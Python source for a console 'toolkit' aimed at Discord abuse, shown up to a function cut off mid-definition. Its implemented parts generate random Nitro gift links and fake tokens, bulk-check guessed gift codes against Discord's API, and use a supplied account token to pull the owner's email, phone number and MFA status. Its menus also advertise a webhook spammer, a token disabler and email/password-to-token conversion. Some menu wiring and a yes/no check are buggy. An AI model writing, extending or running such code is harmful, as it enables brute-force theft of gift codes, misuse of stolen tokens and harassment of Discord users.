#Separators ═║╔╗╚╝╠╣╩╬
#Colorama
from colorama import *
#Others
from pypresence import Presence
import os, requests, random, string, base64, threading, socket, webbrowser, concurrent.futures, sys, time
#Version
Version = "0.2.0"
#Rich Presence
os.system('cls')
DiscordRichPresence = input(f'{Style.BRIGHT}{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Enable Discord Rich Presence? (Y/N): ')
if DiscordRichPresence == "y" or "Y":
    DiscordRichPresence = Presence(1044250743185608775)
    DiscordRichPresence.connect()
    DiscordRichPresence.update(
        details="Online",
        state="Made by Puro#9999",
        large_image="puromask",
        large_text="Puro ToolKit",
        small_image="puro",
        small_text="Made by Puro#9999",
        start=int(time.time()),
        buttons=[{"label":"GitHub Profile","url":"https://github.com/RealPuro"},{"label":"GitHub Repository","url":"https://github.com/RealPuro/PuroToolKit"}]
    )
#Main Menu
def MainMenu():
    os.system(f'title PURO TOOLKIT {Version} - Main Menu')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Main Menu                                             {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} 1 | Credits Menu                                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 2 | Discord Menu                                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 3 | Network Menu                                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 4 | Miscellaneous Menu                                {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 0 | Exit                                              {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            MainMenuChoice = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Option: '))
            if MainMenuChoice == 1:
                CreditsMenu()
            elif MainMenuChoice == 2:
                DiscordMenu()
            elif MainMenuChoice == 3:
                NetworkMenu()
            elif MainMenuChoice == 4:
                MiscMenu()
            elif MainMenuChoice == 0:
                sys.exit()
            else:
                print(f'{Fore.RED}ERROR |  {Fore.WHITE}Please select a valid option')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Main Menu')
            MainMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Credits Menu
def CreditsMenu():
    os.system(f'title PURO TOOLKIT {Version} - Credits Menu')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Credits Menu                                          {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Made By: Puro#9999                                    {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} Version: {Version}                                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} 1 | GitHub                                            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 2 | YouTube                                           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 0 | Main Menu                                         {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            CreditsMenuChoice = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Option: '))
            if CreditsMenuChoice == 1:
                webbrowser.open_new("https://github.com/RealPuro")
            elif CreditsMenuChoice == 2:
                webbrowser.open_new("https://www.youtube.com/channel/UCBqqNNYO5ku5gNgGuf41DLw")
            elif CreditsMenuChoice == 0:
                MainMenu()
            else:
                print(f'{Fore.RED}ERROR |  {Fore.WHITE}Please select a valid option')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Credits Menu')
            CreditsMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu
def DiscordMenu():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Discord Menu                                          {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} 1 | Nitro Generator                                   {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 2 | Nitro Checker (WIP)                               {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 3 | Token Generator                                   {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 4 | Token to Account Info                             {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 5 | Email/Password to Token                           {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 6 | User ID to Half Token                             {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 7 | Webhook Spammer                                   {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 8 | Webhook Deleter                                   {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 9 | Next page                                         {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 0 | Main Menu                                         {Fore.BLACK}║')
    print(f'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#-------------------║
    while True:
        try:
            DiscordMenuChoice = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Option: '))
            if DiscordMenuChoice == 1:
                DiscordNitroGenerator()
            elif DiscordMenuChoice == 2:
                DiscordNitroChecker()
            elif DiscordMenuChoice == 3:
                DiscordTokenGenerator()
            elif DiscordMenuChoice == 4:
                DiscordTokenToAccountInfo()
            elif DiscordMenuChoice == 5:
                DiscordEmailPasswordToToken()
            elif DiscordMenuChoice == 6:
                DiscordUserIdToHalfToken()
            elif DiscordMenuChoice == 7:
                DiscordWebhookSpammer()
            elif DiscordMenuChoice == 8:
                DiscordWebhookDeleter()
            elif DiscordMenuChoice == 9:
                DiscordMenu2()
            elif DiscordMenuChoice == 0:
                MainMenu()
            else:
                print(f'{Fore.RED}ERROR | {Fore.WHITE}Please select a valid option')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu2
def DiscordMenu2():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu 2')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Discord Menu 2                                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} 1 | Hypesquad House                                   {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 2 | Token Unverifier                                  {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 3 | Token Disabler                                    {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 8 | Previous page                                     {Fore.BLACK}║')
    print(f'{Fore.BLACK}║{Fore.WHITE} 0 | Main Menu                                         {Fore.BLACK}║')
    print(f'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:  
            DiscordMenu2Choice = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Option: '))  
            if DiscordMenu2Choice == 1:
                DiscordHypesquadHouse()
            elif DiscordMenu2Choice == 2:
                DiscordTokenDisabler()
            elif DiscordMenu2Choice == 8:
                DiscordMenu()
            elif DiscordMenu2Choice == 3:
                DiscordRichPresence()
            elif DiscordMenu2Choice == 0:
                MainMenu()
            else:
                print(f'{Fore.RED}ERROR | {Fore.WHITE}Please select a valid option')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu 2')
            DiscordMenu2()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Network Menu
def NetworkMenu():
    os.system(f'title PURO TOOLKIT {Version} - Misc Menu')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Network Menu                                          {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} 1 | Local Chat Server                                 {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 2 | Local Chat Client                                 {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 3 | Port Scanner                                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 0 | Main Menu                                         {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            NetworkMenuChoice = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Option: '))
            if NetworkMenuChoice == 1:
                NetworkLocalChatServer()
            elif NetworkMenuChoice == 2:
                NetworkLocalChatClient()
            elif NetworkMenuChoice == 3:
                NetworkPortScanner()
            elif NetworkMenuChoice == 0:
                MainMenu()
            else:
                print(f'{Fore.RED}ERROR | {Fore.WHITE}Please select a valid option')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Network Menu')
            NetworkMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Misc Menu
def MiscMenu():
    os.system(f'title PURO TOOLKIT {Version} - Miscellaneous Menu')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Miscellaneous Menu                                    {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} 1 | Password Generator                                {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 0 | MainMenu                                          {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            MiscMenuChoice = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Option: '))
            if MiscMenuChoice == 1:
                MiscellaneousPasswordGenerator()
            elif MiscMenuChoice == 0:
                MainMenu()
            else:
                print(f'{Fore.RED}ERROR |  {Fore.WHITE}Please select a valid option')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Misc Menu')
            MiscMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Nitro Generator
def DiscordNitroGenerator():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Nitro Generator')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Nitro Generator                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            print(f'{Fore.YELLOW}WARN | {Fore.WHITE}Mostly of the codes will be invalid, so generating a working nitro is very hard.')
            DiscordNitroGeneratorAmount = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Amount: '))
            DiscordNitroGeneratorFileName = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}File Name (Without .txt): ')
            DiscordNitroFile = open(f'{DiscordNitroGeneratorFileName}.txt', 'w')
            DiscordNitroFile.write(f'{DiscordNitroGeneratorAmount} Discord Nitro Codes with a length of 16 characters | Generated with PuroToolKit')
            for i in range(DiscordNitroGeneratorAmount):
                code = 'https://discord.gift/' + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}{code}')
                DiscordNitroFile.write(f'\n{code}')
            DiscordNitroFile.close()
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Generated {DiscordNitroGeneratorAmount} codes with a length of 16 characters')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Nitro Checker
def DiscordNitroChecker():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Nitro Checker')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Nitro Checker                          {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordNitroCheckerFileName = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}File Name (Without .txt): ')
            DiscordNitroCheckerValidSave = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Save Valid Codes? (Y/N): ')
            DiscordNitroCheckerInvalidSave = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Save Invalid Codes? (Y/N): ')
            print('')
            if DiscordNitroCheckerValidSave == "y":
                DiscordValidFile = open(f'{DiscordNitroCheckerFileName}Valid.txt', 'w')
                DiscordValidFile.write(f'Discord Valid Nitro Codes from file {DiscordNitroCheckerFileName}.txt | Checked with PuroToolKit')
            if DiscordNitroCheckerInvalidSave == "y":
                DiscordInvalidFile = open(f'{DiscordNitroCheckerFileName}Invalid.txt', 'w')
                DiscordInvalidFile.write(f'Discord Invalid Nitro Codes from file {DiscordNitroCheckerFileName}.txt | Checked with PuroToolKit')
            with open(f"{DiscordNitroCheckerFileName}.txt") as DiscordNitroCheckerFile:
                for line in DiscordNitroCheckerFile:
                    NitroCode = line.strip("\n")
                    NitroUrl = "https://discordapp.com/api/v6/entitlements/gift-codes/" + NitroCode + "?with_application=false&with_subscription_plan=true"
                    r = requests.get(NitroUrl)
                    if r.status_code == 200:
                        print(f'{Fore.GREEN}VALID ({r.status_code}) | {Fore.WHITE}{NitroCode}')
                        if DiscordNitroCheckerValidSave == "y":
                            DiscordValidFile = open(f'{DiscordNitroCheckerFileName}Valid.txt', 'a')
                            DiscordValidFile.write(f'\n{NitroCode}')
                    else:
                        print(f'{Fore.RED}INVALID ({r.status_code}) | {Fore.WHITE}{NitroCode}')
                        if DiscordNitroCheckerInvalidSave == "y":
                            DiscordInvalidFile = open(f'{DiscordNitroCheckerFileName}Invalid.txt', 'a')
                            DiscordInvalidFile.write(f'\n{NitroCode}')
            DiscordValidFile.close()
            DiscordInvalidFile.close()
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Nitro codes checked')
        except FileNotFoundError:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}This file does not exist')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Token Generator
def DiscordTokenGenerator():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Token Generator')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Token Generator                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            print(f'{Fore.YELLOW}WARN | {Fore.WHITE}Mostly of the tokens will be invalid, so generating a working token is very hard.{Fore.WHITE}')
            DiscordTokenGeneratorAmount = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Amount: '))
            DiscordTokenGeneratorFileName = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}File Name (Without .txt): ')
            DiscordTokenFile = open(f'{DiscordTokenGeneratorFileName}.txt', 'w')
            DiscordTokenFile.write(f'{DiscordTokenGeneratorAmount} Discord Tokens with a length of 70 characters | Generated with PuroToolKit')
            for i in range(DiscordTokenGeneratorAmount):
                code = ('').join(random.choices(string.ascii_letters + string.digits, k=70))
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}{code}')
                DiscordTokenFile.write(f'\n{code}')
            DiscordTokenFile.close()
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Generated {DiscordTokenGeneratorAmount} tokens with a length of 70 characters')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Token Info
def DiscordTokenToAccountInfo():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Token to Account Info')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Token to Account Info                  {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordTokenToAccountInfoToken = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Token: ')
            headers = {'Authorization': DiscordTokenToAccountInfoToken, 'Content-Type': 'application/json'}  
            r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
            if r.status_code == 200:
                userName = r.json()['username'] + '#' + r.json()['discriminator']
                userID = r.json()['id']
                phone = r.json()['phone']
                email = r.json()['email']
                mfa = r.json()['mfa_enabled']
                verified = r.json()['verified']
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}User: {userName}')
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}ID: {userID}')
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Phone: {phone}')
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Email: {email}')
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}MFA: {mfa}')
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Verified: {verified}')
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Token: {DiscordTokenToAccountInfoToken}')
                print(f'{Fore.BLUE}INFO | {Fore.WHITE}Info generated')
            else:
                print(f'{Fore.RED}ERROR | {Fore.WHITE}Invalid Token')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Token from Email/Password
def DiscordEmailPasswordToToken():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Email/Password to Token')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Email/Password to Token                {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
